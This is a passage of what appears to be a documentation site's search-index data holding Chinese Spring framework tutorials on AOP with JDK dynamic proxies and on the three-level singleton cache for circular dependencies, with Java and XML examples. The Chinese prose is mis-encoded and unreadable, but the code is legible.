cn.bugstack.springframework.test.bean.IUserService.*(..))"/>\n        <property name="advice" ref="methodInterceptor"/>\n    </bean>\n</beans>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n',normalizedContent:'# aop\n\naop çè¯çå¯ä»¥è¿½æº¯å°ä¸ä¸çºª 90 å¹´ä»£åæï¼å®ææ©ç± gregor kiczales ç­äººæåºï¼å¹¶å¨ 1997 å¹´åè¡¨äºç»å¸çè®ºæ aspect-oriented programmingãåæ¥ï¼aspectj æä¸ºäº java çæä¸­ä½¿ç¨æå¹¿æ³ç aop æ¡æ¶ä¹ä¸ã\n\naop çç®çæ¯ä¸ºäºè§£å³å¨ oopï¼é¢åå¯¹è±¡ç¼ç¨ï¼ä¸­é¾ä»¥å¤ççæ¨ªåå³æ³¨ç¹é®é¢ï¼å³å°ç³»ç»ä¸å¡é»è¾ä»£ç ä¸å¶ä»éä¸å¡åè½ï¼å¦æ¥å¿è®°å½ãæ§è½ç»è®¡ãå®å¨æ§å¶ç­ï¼åç¦»å¼æ¥ãaop éè¿æè¿äºéä¸å¡åè½ç¬ç«åºæ¥ï¼å¨éè¦æ¶å¨æå°æ¤å¥å°ç³»ç»ä¸­ï¼ä»èå®ç°å¯¹ä¸å¡é»è¾çæ ä¾µå¥å¼å¢å¼ºã\n\naop çæ ¸å¿å¨äºå¶è½å¤å°ä¸å¡é»è¾ä¸éä¸å¡åè½åç¦»å¼æ¥ï¼ä»èéä½äºä»£ç çè¦ååº¦ï¼å¹¶ä¸æ¯æå¨è¿è¡æ¶å¨æå°æ¤å¥åç§»é¤åé¢ãè¿æ ·ä¸æ¥ï¼å°±å¯ä»¥å®ç°æ´å çµæ´»ãå¯ç»´æ¤åå¯æ©å±çç³»ç»ã\n\naop çå·ä½è¡¨ç°åæ¬åé¢ï¼aspectï¼ãè¿æ¥ç¹ï¼join pointï¼ãéç¥ï¼adviceï¼ãåç¹ï¼pointcutï¼åå¼å¥ï¼introductionï¼ç­æ¦å¿µãå¶ä¸­ï¼åé¢æ¯ææ¨ªè·¨å¤ä¸ªå¯¹è±¡çéç¨åè½ï¼è¿æ¥ç¹æ¯ç¨åºæ§è¡è¿ç¨ä¸­è½å¤æå¥åé¢çç¹ï¼éç¥åæ¯å®ä¹äºåé¢å¨è¿æ¥ç¹å¤ææ§è¡çæä½ï¼åç¹åæ¯ä¸ä¸ªè°è¯è¡¨è¾¾å¼ï¼ç¨äºå¹éè¿æ¥ç¹ï¼å¼å¥åæ¯ä¸ºæä¸ªå¯¹è±¡æ·»å æ°çæ¥å£å®ç°ãå·ä½å¦ä¸ä»£ç ï¼\n\n    public void test_proxy_method() {\n        // ç®æ å¯¹è±¡(å¯ä»¥æ¿æ¢æä»»ä½çç®æ å¯¹è±¡)\n        object targetobj = new userservice();\n        // aop ä»£ç\n        iuserservice proxy = (iuserservice) proxy.newproxyinstance(thread.currentthread().getcontextclassloader(), targetobj.getclass().getinterfaces(), new invocationhandler() {\n            // æ¹æ³å¹éå¨\n            methodmatcher methodmatcher = new aspectjexpressionpointcut("execution(* cn.bugstack.springframework.test.bean.iuserservice.*(..))");\n            @override\n            public object invoke(object proxy, method method, object[] args) throws throwable {\n                if (methodmatcher.matches(method, targetobj.getclass())) {\n                    // æ¹æ³æ¦æªå¨\n                    methodinterceptor methodinterceptor = invocation -> {\n                        long start = system.currenttimemillis();\n                        try {\n                            return invocation.proceed();\n                        } finally {\n                            system.out.println("çæ§ - begin by aop");\n                            system.out.println("æ¹æ³åç§°ï¼" + invocation.getmethod().getname());\n                            system.out.println("æ¹æ³èæ¶ï¼" + (system.currenttimemillis() - start) + "ms");\n                            system.out.println("çæ§ - end\\r\\n");\n                        }\n                    };\n                    // åå°è°ç¨\n                    return methodinterceptor.invoke(new reflectivemethodinvocation(targetobj, method, args));\n                }\n                return method.invoke(targetobj, args);\n            }\n        });\n        string result = proxy.queryuserinfo();\n        system.out.println("æµè¯ç»æï¼" + result);\n    }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n\n\nè¿æ®µä»£ç ä½¿ç¨äº jdk å¨æä»£çå®ç° aop çåè½ï¼æ²¡æä½¿ç¨ spring æä¾çæ¹æ³ãç±»åæ³¨è§£ç­ã\n\n * è¿æ¥ç¹ï¼è¿æ¥ç¹æ¯å¨ç®æ å¯¹è±¡ä¸å¹éçç¹å®ç¹ï¼è¿éçè¿æ¥ç¹æ¯ iuserservice æ¥å£ä¸­çæææ¹æ³ï¼ç±äºä½¿ç¨äº targetobj.getclass ().getinterfaces () è·åç®æ å¯¹è±¡æå®ç°çæ¥å£ï¼å æ­¤åªæ¦æªäº iuserservice æ¥å£ä¸­çæ¹æ³ã\n * åé¢ï¼åé¢æ¯ä¸ä¸ªæ¨¡ååçæ¨ªåå³æ³¨ç¹ï¼å¨è¿éæä»¬å¯ä»¥è§ä¸ºæ²¡ææ¾å¼å®ä¹çåé¢ãèæ¯ç´æ¥å¨ invocationhandler.invoke () ä¸­å®ç°äºæ¦æªåå¢å¼ºé»è¾ï¼åæ¬æ¹æ³å¹éå¨ãæ¹æ³æ¦æªå¨ååå°è°ç¨ç­ã\n * åç¹ï¼åç¹æ¯ä¸ç§è°è¯è¡¨è¾¾å¼ï¼ç¨äºå¹éè¿æ¥ç¹ãè¿éä½¿ç¨äº aspectj è¡¨è¾¾å¼ "execution (* cn.bugstack.springframework.test.bean.iuserservice.*(..))"ï¼å®å¹éäº iuserservice æ¥å£ä¸­çæææ¹æ³ã\n * éç¥ï¼éç¥ç±»ååæ¬åç½®éç¥ãåç½®éç¥ãç¯ç»éç¥ãæåºéç¥åæç»éç¥ãå¨è¿éä½¿ç¨äºç¯ç»éç¥ï¼å³å¨æ¹æ³æ§è¡ä¹ååä¹åæ·»å äºçæ§é»è¾ã\n * å¼å¥ï¼å¼ä»éå¸¸æ¯ä¸ä¸ªç¹æ®çéç¥ç±»åï¼å®åè®¸å¨è¿è¡æ¶ä¸ºç±»å¨æå°æ·»å æ°æ¥å£å®ç°ãè¿éæ²¡æä½¿ç¨å¼ä»ã\n\n\n# å°è£\n\nå¨ spring ä¸­ï¼æ ¸å¿é»è¾æ¯ç¦»ä¸å¼ä¸é¢çä»£çä¾å­çï¼åªæ¯ç¸å¯¹åºåäºäºå°è£ï¼æä»¬åç¨ç±»å¾æ¥ç®åè¯´æä¸å°è£å³ç³»ï¼\n\n\n\nç¨æµè¯ä¾å­æ¥è¯´ææ¯æ­¥çæ ¸å¿\n\n    /**\n     * åç¹è¡¨è¾¾å¼ï¼æ¥éªè¯åç¹\n     * @throws nosuchmethodexception\n     */\n    @test\n    public void test_aop() throws nosuchmethodexception {\n        aspectjexpressionpointcut pointcut = new aspectjexpressionpointcut("execution(* cn.bugstack.springframework.test.bean.userservice.*(..))");\n        class<userservice> clazz = userservice.class;\n        method method = clazz.getdeclaredmethod("queryuserinfo");\n        system.out.println("åç¹æ¯å¦åå«è¯¥ç±»ï¼" + pointcut.matches(clazz));\n        system.out.println("åç¹æ¯å¦åå«è¯¥ç±»è¯¥æ¹æ³ï¼" + pointcut.matches(method, clazz));\n    }\n\n    /**\n     * åé¢ å å¨æä»£ç\n     */\n    @test\n    public void test_dynamic() {\n        // ç®æ å¯¹è±¡\n        iuserservice userservice = new userservice();\n        // ç»è£ä»£çä¿¡æ¯ï¼åé¢\n        advisedsupport advisedsupport = new advisedsupport();\n        // è®¾ç½®ä»£çç®æ å¯¹è±¡\n        advisedsupport.settargetsource(new targetsource(userservice));\n        // è®¾ç½®æ¦æªå¨\n        advisedsupport.setmethodinterceptor(new userserviceinterceptor());\n        // å¹éä»£çå¯¹è±¡\n        advisedsupport.setmethodmatcher(new aspectjexpressionpointcut("execution(* cn.bugstack.springframework.test.bean.iuserservice.*(..))"));\n        // ä»£çå¯¹è±¡(jdkdynamicaopproxy)\n        iuserservice proxy_jdk = (iuserservice) new jdkdynamicaopproxy(advisedsupport).getproxy();\n        // æµè¯è°ç¨\n        system.out.println("æµè¯ç»æï¼" + proxy_jdk.queryuserinfo());\n        // ä»£çå¯¹è±¡(cglib2aopproxy)\n        iuserservice proxy_cglib = (iuserservice) new cglib2aopproxy(advisedsupport).getproxy();\n        // æµè¯è°ç¨\n        system.out.println("æµè¯ç»æï¼" + proxy_cglib.register("è±è±"));\n    }\n\npublic class userserviceinterceptor implements methodinterceptor {\n    @override\n    public object invoke(methodinvocation invocation) throws throwable {\n        long start = system.currenttimemillis();\n        try {\n            return invocation.proceed();\n        } finally {\n            system.out.println("çæ§ - begin by aop");\n            system.out.println("æ¹æ³åç§°ï¼" + invocation.getmethod());\n            system.out.println("æ¹æ³èæ¶ï¼" + (system.currenttimemillis() - start) + "ms");\n            system.out.println("çæ§ - end\\r\\n");\n        }\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n\n\n\n# æå°è£çèå¥å° spring ä¸­\n\nå³ä¾§é¨åå°±æ¯æè¿°äºæ´ä¸ªèåå° spring ä¸­çç±»ï¼ä¼å¨ bean åå»ºçè¿ç¨ä¸­ åå§åæ¹æ³ä¹å è¿ä¸ªçå½å¨æååæ¾å°æ¯å¦æä¾äº defaultadvisorautoproxycreator ç±»çæ¯æï¼å ä¸ºä»æè¿°äºå·ä½ä»£çç±»çè¿ç¨ã\n\n> ä¸ºä»ä¹ä¼å¨åå§åæ¹æ³ä¹åæè¿è¡ä»£çï¼æ¯å ä¸ºä»£çç±»ä¹éè¦çå±æ§ä¹éè¦è¢«å¡«åï¼æä»¥ç­å¡«åå®æ¯åå¨ä»£ç\n\n\n\næ ¸å¿æ¹æ³ï¼æè¿°äºæ´ä¸ªç±»è¢«ä»£ççè¿ç¨\n\n    protected object wrapifnecessary(object bean, string beanname) {\n        // å¤æ­beanæ¯å¦æ¯adviceï¼pointcutï¼advisorçå­ç±»æèä¸¤ç±»ç¸åå¯ä»¥ç¸äºè½¬ï¼ç±»å±é¢ï¼ï¼ç¨æ·å®ä¹çç±»é½æ¯ false\n        if (isinfrastructureclass(bean.getclass())) return bean;\n        // å¾å°æ³¨åçaspectjexpressionpointcutadvisor\n        collection<aspectjexpressionpointcutadvisor> advisors = beanfactory.getbeansoftype(aspectjexpressionpointcutadvisor.class).values();\n        for (aspectjexpressionpointcutadvisor advisor : advisors) {\n            classfilter classfilter = advisor.getpointcut().getclassfilter();\n            // ç¨è¡¨è¾¾å¼ è¿æ»¤å¹éç±»\n            if (!classfilter.matches(bean.getclass())) continue;\n            // å°è£\n            advisedsupport advisedsupport = new advisedsupport();\n            targetsource targetsource = new targetsource(bean);\n            advisedsupport.settargetsource(targetsource);\n            advisedsupport.setmethodinterceptor((methodinterceptor) advisor.getadvice());\n            advisedsupport.setmethodmatcher(advisor.getpointcut().getmethodmatcher());\n            advisedsupport.setproxytargetclass(true);\n            // è¿åä»£çå¯¹è±¡\n            return new proxyfactory(advisedsupport).getproxy();\n        }\n        return bean;\n    }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n\n\n<beans>\n    \x3c!-- ç®æ ç±» --\x3e\n    <bean id="userservice" class="cn.bugstack.springframework.test.bean.userservice"/>\n    \x3c!-- ä»£çç±» --\x3e\n    <bean id="beforeadvice" class="cn.bugstack.springframework.test.bean.userservicebeforeadvice"/>\n    \x3c!-- ç»ä»¶ç±»ï¼è³å³éè¦ --\x3e\n    <bean class="cn.bugstack.springframework.aop.framework.autoproxy.defaultadvisorautoproxycreator"/>\n    \x3c!-- \n        è¿éæ¯  advisedsupport.setmethodinterceptor((methodinterceptor) advisor.getadvice()); è®¾ç½®æ¦æªå¨ï¼\n        å¯ä»¥æ¯åç½®æ¦æªï¼åç½®æ¦æªï¼æèç¯ç»æ¦æª\n     --\x3e\n    <bean id="methodinterceptor" class="cn.bugstack.springframework.aop.framework.adapter.methodbeforeadviceinterceptor">\n        <property name="advice" ref="beforeadvice"/>\n    </bean>\n    \x3c!-- åé¢è¡¨è¾¾å¼ --\x3e\n    <bean id="pointcutadvisor" class="cn.bugstack.springframework.aop.aspectj.aspectjexpressionpointcutadvisor">\n        <property name="expression" value="execution(* cn.bugstack.springframework.test.bean.iuserservice.*(..))"/>\n        <property name="advice" ref="methodinterceptor"/>\n    </bean>\n</beans>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n',charsets:{cjk:!0}},{title:"æ ¸å¿åå®¹æè§£ ä¸çº§ç¼å­",frontmatter:{title:"æ ¸å¿åå®¹æè§£ ä¸çº§ç¼å­",date:"2023-06-25T09:22:36.000Z",permalink:"/spring/spring/203/",sidebar:!0,article:!1,comment:!1,editLink:!1},regularPath:"/00.java/20.Spring/21.spring/203.%E6%A0%B8%E5%BF%83%E5%86%85%E5%AE%B9%E6%8B%86%E8%A7%A3%20%E4%B8%89%E7%BA%A7%E7%BC%93%E5%AD%98.html",relativePath:"00.java/20.Spring/21.spring/203.æ ¸å¿åå®¹æè§£ ä¸çº§ç¼å­.md",key:"v-c385f750",path:"/spring/spring/203/",headers:[{level:2,title:"ä»£ç ä»ç»",slug:"ä»£ç ä»ç»",normalizedTitle:"ä»£ç ä»ç»",charIndex:679},{level:2,title:"æµç¨ä»ç»",slug:"æµç¨ä»ç»",normalizedTitle:"æµç¨ä»ç»",charIndex:7320},{level:2,title:"ä¸åçå¾ªç¯ä¾èµé®é¢",slug:"ä¸åçå¾ªç¯ä¾èµé®é¢",normalizedTitle:"ä¸åçå¾ªç¯ä¾èµé®é¢",charIndex:10231},{level:3,title:"set å¾ªç¯ä¾èµ",slug:"set-å¾ªç¯ä¾èµ",normalizedTitle:"set å¾ªç¯ä¾èµ",charIndex:10245},{level:3,title:"æé å¨ å¾ªç¯ä¾èµ",slug:"æé å¨-å¾ªç¯ä¾èµ",normalizedTitle:"æé å¨ å¾ªç¯ä¾èµ",charIndex:11876},{level:3,title:"@DependsOn",slug:"dependson",normalizedTitle:"@dependson",charIndex:14362}],lastUpdated:"12/22/2023, 3:44:32 PM",lastUpdatedTimestamp:1703231072e3,headersStr:"ä»£ç ä»ç» æµç¨ä»ç» ä¸åçå¾ªç¯ä¾èµé®é¢ set å¾ªç¯ä¾èµ æé å¨ å¾ªç¯ä¾èµ @DependsOn",content:"Spring ä¸çº§ç¼å­æ¯ Spring æ¡æ¶ä¸­ç¨äºç®¡ç Bean å¯¹è±¡çç¼å­æºå¶ãå®ç±ä¸ä¸ªä¸åçç¼å­åºåç»æï¼åå«æ¯ singletonObjectsãearlySingletonObjects å singletonFactoriesã\n\n * singletonObjectsï¼ä¸çº§ç¼å­ï¼æåå¯¹è±¡ï¼ï¼åä¾å¯¹è±¡ç¼å­åºåå­å¨å·²ç»å®å¨åå§ååçåä¾å¯¹è±¡ãå½ç¬¬ä¸æ¬¡ä½¿ç¨ getBean () æ¹æ³è·å bean æ¶ï¼Spring ä¼å°è¯ä»è¿ä¸ªç¼å­åºè·åå¯¹è±¡ï¼å¦æè½å¤æ¾å°ï¼åç´æ¥è¿åè¯¥å¯¹è±¡å®ä¾ã\n * earlySingletonObjectsï¼äºçº§ç¼å­ï¼ä»£çå¯¹è±¡ï¼ç¹æ®çæåå¯¹è±¡ï¼ï¼å¦æä¸ä¸ªåä¾å¯¹è±¡éè¦å¼ç¨å¦ä¸ä¸ªåä¾å¯¹è±¡ï¼ä½åèå°æªè¢«å®å¨åå§åï¼é£ä¹å®¹å¨å°åå»ºä¸ä¸ªä»£çå¯¹è±¡ï¼Proxy Objectï¼ï¼å¹¶å°å¶æ¾å° earlySingletonObjects ä¸­ãè¿ä¸ªä»£çå¯¹è±¡ä¼æ´é²ä¸å®éå¯¹è±¡ç¸åçæ¥å£ï¼å¹¶ä¸è½å¤å¯¹å¶è¿è¡ä¸äºåºæ¬æä½ï¼ä½æ¯å®è¿æ²¡æè¢«å®å¨åå§åã\n * singletonFactoriesï¼ä¸çº§ç¼å­ï¼åæåå¯¹è±¡ä¹æ¯å·¥åå¯¹è±¡ï¼ï¼åä¾å·¥åç¼å­åºåå­å¨åå»º bean å®ä¾ç ObjectFactoryãå¨ Bean ä¾èµå³ç³»çåå»ºè¿ç¨ä¸­ï¼å¦æ A ä¾èµ Bï¼B åä¾èµ Aï¼é£ä¹å¨åå»º A å B çè¿ç¨ä¸­å°±ä¼åºç°å¾ªç¯ä¾èµçé®é¢ãSpring å°±æ¯éè¿æåæ´é²ä¸ä¸ªæªå®æåå§åç Bean æ¥è§£å³è¿ä¸ªé®é¢çã\n\næç¤º\n\nå¯¹äº spring è®¾è®¡æ²¡æå®å¨çè§£çåå­¦å¯è½å¾é¾æç½ä»¥ä¸çè¯ï¼è¿æ¯éè¦ç¨ä»£ç å ä¸è¯´æï¼ä»¥ä¸æç« ä¼è®®ä»£ç çæ¹å¼å¨ç¨è®²æ¸æ¥\n\n\n# ä»£ç ä»ç»\n\né¦å Spring å¨åå§åçæ¶åä¼åæææ Bean å è½½å° Beandefinition çç¼å­ä¸­ï¼åç»­ææå¯¹ Bean çåå»ºé½æ¯ä» Beandefinition ä¸­è·åè¯¦ç»å¯ä»¥ç Spring æºç éè¯»ï¼ä¸ï¼ ï¼ç¶ååè¿è¡ Bean çå½å¨æçè¿ç¨ï¼åå»ºå¥½ Bean çå®ä¾æ¾å¥å° singletonObjects ç¼å­ä¸­ï¼ä½æ¯ä»£ç çç¬¬ä¸æ­¥é½æ¯ä»è·åå¼å§ï¼åªæè·åä¸å°ææåå»º\n\n    public Object getBean(String name) throws BeansException {\n        return doGetBean(name, null);\n    }\n\n    public Object getBean(String name, Object... args) throws BeansException {\n        return doGetBean(name, args);\n    }\n\n    public <T> T getBean(String name, Class<T> requiredType) throws BeansException {\n        return (T) getBean(name);\n    }\n\n    protected <T> T doGetBean(final String name, final Object[] args) {\n        // ä»ç¼å­ä¸­è·åå®ä¾\n        Object sharedInstance = getSingleton(name);\n        if (sharedInstance != null) {\n            // å¦æå®ç°äº FactoryBeanï¼åéè¦è°ç¨ FactoryBean#getObject\n            return (T) getObjectForBeanInstance(sharedInstance, name);\n        }\n        // ä»BeanDefinitionåè¡¨ä¸­è·åå¯¹è±¡\n        BeanDefinition beanDefinition = getBeanDefinition(name);\n        // Beanå®ä¾çåå»ºè¿ç¨\n        Object bean = doCreateBean(name, beanDefinition, args);\n        // å¦æå®ç°äº FactoryBeanï¼åéè¦è°ç¨ FactoryBean#getObject\n        return (T) getObjectForBeanInstance(bean, name);\n    }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n\n\nå¯ä»¥çå° getSingleton æ¹æ³å°±æ¯è·ååä¾ï¼ä¸æ¦æåç´æ¥è¿åï¼ä½ç¬¬ä¸æ¬¡è¯å®æ¯æ²¡æçï¼è¯¦ç»çä¸ä»çè·åæ¹å¼\n\n    public Object getSingleton(String beanName) {\n        // ä»ä¸çº§ç¼å­ä¸­è·å\n        Object singletonObject = singletonObjects.get(beanName);\n        if (null == singletonObject) {\n            singletonObject = earlySingletonObjects.get(beanName);\n            // å¤æ­äºçº§ç¼å­ä¸­æ¯å¦æå¯¹è±¡ï¼è¿ä¸ªå¯¹è±¡å°±æ¯ä»£çå¯¹è±¡ï¼å ä¸ºåªæä»£çå¯¹è±¡æä¼æ¾å°ä¸çº§ç¼å­ä¸­\n            if (null == singletonObject) {\n                ObjectFactory<?> singletonFactory = singletonFactories.get(beanName);\n                if (singletonFactory != null) {\n                    singletonObject = singletonFactory.getObject();\n                    // æä¸çº§ç¼å­ä¸­çä»£çå¯¹è±¡ä¸­ççå®å¯¹è±¡è·ååºæ¥ï¼æ¾å¥äºçº§ç¼å­ä¸­\n                    earlySingletonObjects.put(beanName, singletonObject);\n                    singletonFactories.remove(beanName);\n                }\n            }\n        }\n        return singletonObject;\n    }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n\n\næ²¡æè·åå°å®ä¾åä» beanDefinition ä¸­è·å Bean çå®ä¹ä¿¡æ¯è°ç¨ doCreateBean åå»º Bean çå®ä¾\n\n    protected Object doCreateBean(String beanName, BeanDefinition beanDefinition, Object[] args) {\n        Object bean = null;\n        try {\n            // å®ä¾å Bean\n            bean = createBeanInstance(beanDefinition, beanName, args);\n            // å¤çå¾ªç¯ä¾èµï¼å°å®ä¾ååçBeanå¯¹è±¡æåæ¾å¥ç¼å­ä¸­æ´é²åºæ¥\n            if (beanDefinition.isSingleton()) {\n                Object finalBean = bean;\n                addSingletonFactory(beanName, () -> getEarlyBeanReference(beanName, beanDefinition, finalBean));\n            }\n            // æ¯å¦éè¦ç»§ç»­è¿è¡åç»­çå±æ§å¡«å\n            boolean continueWithPropertyPopulation = applyBeanPostProcessorsAfterInstantiation(beanName, bean);\n            if (!continueWithPropertyPopulation) {\n                return bean;\n            }\n            // å¨è®¾ç½® Bean å±æ§ä¹åï¼åè®¸ BeanPostProcessor ä¿®æ¹å±æ§å¼ï¼æ³¨è§£å±æ§å¡«åï¼\n            applyBeanPostProcessorsBeforeApplyingPropertyValues(beanName, bean, beanDefinition);\n            // ç» Bean å¡«åå±æ§ï¼xmlå±æ§å¡«åï¼\n            applyPropertyValues(beanName, bean, beanDefinition);\n            // æ§è¡ Bean çåå§åæ¹æ³å BeanPostProcessor çåç½®ååç½®å¤çæ¹æ³\n            bean = initializeBean(beanName, bean, beanDefinition);\n        } catch (Exception e) {\n            throw new BeansException(\"Instantiation of bean failed\", e);\n        }\n        // æ³¨åå®ç°äº DisposableBean æ¥å£ç Bean å¯¹è±¡\n        registerDisposableBeanIfNecessary(beanName, bean, beanDefinition);\n        // å¤æ­ SCOPE_SINGLETONãSCOPE_PROTOTYPE\n        Object exposedObject = bean;\n        if (beanDefinition.isSingleton()) {\n            // è·åä»£çå¯¹è±¡\n            exposedObject = getSingleton(beanName);\n            registerSingleton(beanName, exposedObject);\n        }\n        return exposedObject;\n    }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n\n\nå¶ä¸­ applyPropertyValues è¿ä¸ªæ¹æ³ï¼å¯¹è¦åå»ºçå®ä¾è¿è¡å±æ§å¡«åçæ¶åä¼è¿å¥å¾ªç¯ä¾èµçé®é¢ï¼ä¸æ¦éå°æ¯ BeanReference ç±»åçï¼åä¼è°ç¨ getBean æ¹æ³å»è·åå®ä¾ï¼è¯¥æ¹æ³åä¼åå°ä¸é¢çæ¹æ³ã\n\n    protected void applyPropertyValues(String beanName, Object bean, BeanDefinition beanDefinition) {\n        try {\n            // è¿éè·åå°  bean ä¿¡æ¯éçå±æ§æåªäºï¼ä¹å°±æ¯ä¸ä¸ªå¯¹è±¡æåªäºå±æ§ï¼å¹¶å¾ªç¯èµå¼å°æåå»ºå®ä¾çå±æ§ä¸­å»\n            PropertyValues propertyValues = beanDefinition.getPropertyValues();\n            for (PropertyValue propertyValue : propertyValues.getPropertyValues()) {\n                String name = propertyValue.getName();\n                Object value = propertyValue.getValue();\n                if (value instanceof BeanReference) {\n                    // A ä¾èµ Bï¼è·å B çå®ä¾å\n                    BeanReference beanReference = (BeanReference) value;\n                    value = getBean(beanReference.getBeanName());\n                }\n                // ç±»åè½¬æ¢ï¼ä¸æ¯ä¾§éç¹å¯ä»¥ä¸ç\n                else {\n                    Class<?> sourceType = value.getClass();\n                    Class<?> targetType = (Class<?>) TypeUtil.getFieldType(bean.getClass(), name);\n                    ConversionService conversionService = getConversionService();\n                    if (conversionService != null) {\n                        if (conversionService.canConvert(sourceType, targetType)) {\n                            value = conversionService.convert(value, targetType);\n                        }\n                    }\n                }\n                // åå°è®¾ç½®å±æ§å¡«å\n                 BeanUtil.setFieldValue(bean, name, value);\n            }\n        } catch (Exception e) {\n            throw new BeansException(\"Error setting property valuesï¼\" + beanName + \" messageï¼\" + e);\n        }\n    }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n\n\nå½ä¸ä¸ªå®ä¾çåå»ºåºæ¬å®æï¼ä»ä¼æèªå·±æ·»å å°ä¸çº§ç¼å­å¯¹è±¡ï¼åä¸ºä¸ä¸ªæåæä¾ç»å¶ä»æ¹æ³ä½¿ç¨ãå¦ä¸æ¹æ³å°±æ¯æ·»å å°ä¸çº§ç¼å­çè¿ç¨ï¼å¶ä¸­ getSingleton å¨è·åä¸çº§ç¼å­æ°æ®å°äºçº§ç¼å­çæ¶åä¼æ§è¡ singletonFactory.getObject (); è¿æ¯ä¸ä¸ªæ¹æ³ï¼ä¼å»æ§è¡ getEarlyBeanReference (beanName, beanDefinition, finalBean) æ¹æ³ï¼è¯¥æ¹æ³ä¼å¾å°å·¥åæ¹æ³éé¢çä¸ä¸ªä»£çå¯¹è±¡ãç¶ååæä»£çå¯¹è±¡å­å°ä¸çº§ç¼å­ãè³æ­¤ Bean çå®ä¾åå°ç¼å­çè¿ç¨å°±ç»æã\n\n// å¤æ­ SCOPE_SINGLETONãSCOPE_PROTOTYPE\nObject exposedObject = bean;\nif (beanDefinition.isSingleton()) {\n    // æä¸çº§ç¼å­å¯¹è±¡è½¬æ¢ä¸ºäºçº§ç¼å­å¯¹è±¡\n    exposedObject = getSingleton(beanName);\n    // æäºçº§ç¼å­å¯¹è±¡è½¬æ¢ä¸ºä¸çº§ç¼å­å¯¹è±¡\n    registerSingleton(beanName, exposedObject);\n}\n\n// getSingleton çé¨åä»£ç å®ç°\nObjectFactory<?> singletonFactory = singletonFactories.get(beanName);\nif (singletonFactory != null) {\n    // è·åä»£çå¯¹è±¡\n    singletonObject = singletonFactory.getObject();\n    // æä¸çº§ç¼å­ä¸­çä»£çå¯¹è±¡ä¸­ççå®å¯¹è±¡è·ååºæ¥ï¼æ¾å¥äºçº§ç¼å­ä¸­\n    earlySingletonObjects.put(beanName, singletonObject);\n    singletonFactories.remove(beanName);\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n\n\n\n# æµç¨ä»ç»\n\næäºå®æ´çæ¦å¿µåï¼æä»¬å¯ä»¥èèå¾ªç¯ä¾èµçå­å¨ï¼å½ A ä¾èµ Bï¼B åä¾èµ Aï¼é£ä¹è§£å³ä¾èµçè¿ç¨åæ¯å¦ä½åçï¼å¯ä»¥çä¸å¾ï¼\n\n\n\n 1. ä¼åå¨ getBean æ¹æ³éé¢æ¾ Aï¼éè¿ä¸äºä¸çº§ç¼å­ä¸­å¯»æ¾ï¼å¦ææ¾å°åç´æ¥è¿å\n 2. æ²¡æ¾å°å°±å»åå»º A å¹¶æ¾å¥ singletonFactories ä¸çº§ç¼å­ï¼ä¼å¯¹ A çå±æ§å¼è¿è¡å¡«åï¼æ­¤æ¶ A çå±æ§ä¾èµäº Bï¼å°±è¦è°ç¨ getBean æ¾ B\n 3. éè¿å¨ getBean ç ä¸äºä¸çº§ç¼å­æ¥æ¾ï¼å¦ææ¾å°äºç´æ¥è¿å\n 4. æ²¡æ¾å°å°±å»åå»º B å¹¶æ¾å¥ singletonFactories ä¸çº§ç¼å­ï¼ä¼å¯¹ B çå±æ§å¼è¿è¡å¡«åï¼æ­¤æ¶ B çå±æ§ä¾èµäº Aï¼å°±è¦è°ç¨ getBean æ¾ A\n 5. æ­¤æ¶ç A å·²ç»å¨ä¸çº§ç¼å­ï¼å¯ä»¥å¨ä¸çº§ç¼å­ä¸­æ¾å°ï¼æ¾å°åä¼çæ A ä»£çå¯¹è±¡ æ¾å¥ earlySingletonObjects äºçº§ç¼å­å¹¶è¿åè¿ä¸ªä»£çå¯¹è±¡\n 6. B æäºå±æ§ A çä»£çå¯¹è±¡ï¼æ­¤æ¶ B ææå±æ§å¡«åå®æ¯åï¼å°±è¦æ B æ·»å å°ä¸çº§ç¼å­ï¼ä½æ­¤æ¶ç B å¨ä¸çº§ç¼å­ï¼ä¼åæä¸çº§ç¼å­å¯¹è±¡çæä»£çåæ¾å¥å° earlySingletonObjects äºçº§ç¼å­ï¼åç±äºçº§ç¼å­æå¯¹è±¡æ¾å° singletonObjects ä¸çº§ç¼å­å¯¹è±¡\n 7. æ­¤æ¶ç B å·²ç»æ¾å°ä¸çº§ç¼å­å¯¹è±¡äºï¼å¹¶ç»æäº B çåå»ºæµç¨ï¼æä»¥ä¼è¿åå°ç¬¬ 2 æ­¥ï¼A å°±æäº B çå®ä¾ï¼A çå±æ§å¡«åå®æ¯åï¼å°±è¦æ A æ·»å å°ä¸çº§ç¼å­ï¼ä½æ­¤æ¶ç A å·²ç»å¨äºçº§ç¼å­ï¼æä»¥å°±å¯ä»¥ç´æ¥æ¾å¥å° singletonObjects ä¸çº§ç¼å­\n\nç°å¨æä»¬ç¥éï¼æç§ Spring æ¡æ¶çè®¾è®¡ï¼ç¨äºè§£å³å¾ªç¯ä¾èµéè¦ç¨å°ä¸ä¸ªç¼å­ï¼è¿ä¸ä¸ªç¼å­åå«å­æ¾äº singletonObjects 